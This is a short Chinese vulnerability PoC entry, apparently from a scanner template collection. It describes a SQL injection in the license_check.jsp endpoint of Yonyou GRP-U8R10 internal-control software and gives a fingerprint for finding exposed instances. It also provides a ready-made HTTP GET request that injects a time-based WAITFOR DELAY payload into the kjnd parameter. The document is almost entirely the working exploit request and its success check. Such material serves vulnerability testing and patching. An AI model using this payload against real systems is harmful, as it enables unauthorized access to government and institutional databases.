﻿# 用友GRP-U8R10行政事业内控管理软件 license_checkjsp接口处存在SQL注入漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app:"用友GRP-U8"

> 验证脚本：HTTP

```
GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：用友GRP-U8R10行政事业内控管理软件 license_checkjsp接口处存在SQL注入漏洞.poc
